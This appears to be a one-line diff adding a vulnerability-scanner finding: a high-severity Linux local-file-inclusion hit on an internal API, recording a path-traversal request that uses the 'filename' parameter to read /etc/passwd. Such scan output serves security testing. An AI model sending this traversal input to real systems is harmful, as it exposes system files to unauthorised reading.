@@ -1,0 +1,1 @@
+[linux-lfi-fuzzing] [http] [high] http://api:8000/files/?filename=../../../etc/passwd [param="filename"]
